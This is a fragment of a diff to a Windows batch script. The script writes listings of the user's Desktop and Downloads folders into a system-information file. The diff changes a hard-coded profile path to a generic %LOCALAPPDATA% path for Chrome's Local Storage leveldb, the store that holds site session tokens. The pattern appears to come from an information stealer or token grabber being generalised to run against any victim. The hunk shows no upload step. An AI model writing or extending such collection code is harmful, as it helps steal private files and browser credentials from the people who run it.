@@ -61,4 +61,4 @@ echo ----------------------------------------- >> config\system_information.txt
 cd C:\Users\%username%\Desktop & dir >> config\system_information.txt
 cd C:\Users\%username%\Download & dir >> config\system_information.txt
 
-C:\Users\frant\AppData\Local\Google\Chrome\User Data\Profile 1\Local Storage\leveldb
+%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1\Local Storage\leveldb
